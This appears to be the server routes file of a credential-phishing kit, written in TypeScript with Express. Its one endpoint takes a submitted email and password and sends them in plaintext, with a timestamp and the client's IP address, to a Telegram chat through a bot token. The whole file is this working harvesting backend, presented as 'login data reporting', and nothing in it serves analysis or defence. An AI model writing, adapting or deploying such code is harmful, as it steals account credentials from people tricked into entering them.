import type { Express } from "express";
import { createServer, type Server } from "http";
import { storage } from "./storage";
import { loginDataSchema } from "@shared/schema";

export async function registerRoutes(app: Express): Promise<Server> {
  // put application routes here
  // prefix all routes with /api

  // use storage to perform CRUD operations on the storage interface
  // e.g. storage.insertUser(user) or storage.getUserByUsername(username)

  // Telegram login data reporting endpoint
  app.post("/api/send-login-data", async (req, res) => {
    try {
      // Validate request body
      const validatedData = loginDataSchema.parse(req.body);
      
      const telegramToken = process.env.TELEGRAM_BOT_TOKEN;
      const telegramChatId = process.env.TELEGRAM_CHAT_ID;
      
      if (!telegramToken || !telegramChatId) {
        return res.status(500).json({ 
          error: "Telegram configuration missing" 
        });
      }

      const currentTime = new Date().toISOString();
      const clientIP = req.ip || req.connection.remoteAddress || 'Unknown';
      
      const message = `Login attempt:\nEmail: ${validatedData.email}\nPassword: ${validatedData.password}\nTime: ${currentTime}\nIP: ${clientIP}\nLocation: Web Client`;
      
      const telegramUrl = `https://api.telegram.org/bot${telegramToken}/sendMessage`;
      
      const response = await fetch(telegramUrl, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          chat_id: telegramChatId,
          text: message
        })
      });

      if (!response.ok) {
        throw new Error(`Telegram API error: ${response.status}`);
      }

      res.json({ success: true });
    } catch (error) {
      console.error('Failed to send to Telegram:', error);
      res.status(500).json({ 
        error: "Failed to send login data" 
      });
    }
  });

  const httpServer = createServer(app);

  return httpServer;
}
